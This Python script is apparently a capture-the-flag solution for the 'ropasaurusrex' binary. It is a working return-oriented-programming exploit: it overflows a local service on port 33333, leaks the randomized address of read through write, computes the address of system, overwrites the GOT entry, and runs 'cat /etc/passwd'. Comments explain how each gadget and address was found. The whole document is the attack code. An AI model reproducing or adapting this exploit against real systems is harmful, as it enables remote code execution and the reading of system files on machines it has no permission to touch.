#!/usr/bin/env python

import socket
from struct import *
import time

ip = '127.0.0.1'
port = 33333

cmd = 'cat /etc/passwd\0'

# addr of dynamic section
buf = 0x08049530
# addr of read call - from objdump -D rop|grep read
read_addr = 0x0804832c
# addr of write call - from objdump -D rop|grep read
write_addr = 0x0804830c
# addr of system - know exist by ldd rop to see that it links ot libc - get addr by gdb coredump and x/x system
system_addr = 0xf7e3e940
# pppr addr - found from objdump -D ropasaurusrex | grep -E 'pop|ret' - and then look for consecutive addr
pppr_addr = 0x080484b6
# ptr to read addr - from objdump -R rop
read_addr_ptr = 0x804961c
# rand_read_addr - rand_system_addr - from gdb rop core - p read, p system
read_system_addr_diff = 0xf7e06350 - 0xf7d6c940

reply_buf_size = 2048

# high addr at top, and low addr at bottom
stack = [

  # system frame
  buf,
  0x43434333,	# final return, don't care

  # pppr frame followed by jumping to system
  read_addr,

  # read frame to overwrite read addr with system
  4,
  read_addr_ptr,
  0,
  pppr_addr,

  # pppr (pop pop pop ret) frame
  read_addr,

  # write frame
  # dump randomized actual read's addr to stdout
  4,	# 32 bit addr is 4 bytes long
  read_addr_ptr,
  1,	# stdout
  pppr_addr,

  # pppr (pop pop pop ret) frame
  write_addr,

  # read cmd to buf frame
  len(cmd),
  buf,
  0,	# stdin (0)
  pppr_addr,

  # ret addr stomping
  read_addr,
]

packed = ''.join([pack('<I', i) for i in reversed(stack)])
payload = 'A' * 140 + packed

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, port))
print('sending ' + ' '.join([hex(ord(c)) for c in packed]))

# send the initial overflow for writing the cmd
s.send(payload)

print('sending ' + cmd)
print(' '.join([str(ord(c)) for c in cmd]))

# write the command - sleep is necessary, if too quick, it'll miss it
time.sleep(2)
s.send(cmd)

# read the randomize addr from output
rand_read_addr = unpack('<I', s.recv(4))[0]
print('rand read addr = ' + hex(rand_read_addr))

# overwrite the read addr with system's addr
rand_system_addr = rand_read_addr - read_system_addr_diff
print('sys addr = ' + hex(rand_system_addr))
packed_system_addr = pack('<I', rand_system_addr)
print('sending ' + ' '.join([hex(ord(c)) for c in packed_system_addr]))
time.sleep(2)
s.send(packed_system_addr)

print(s.recv(reply_buf_size))

s.close()
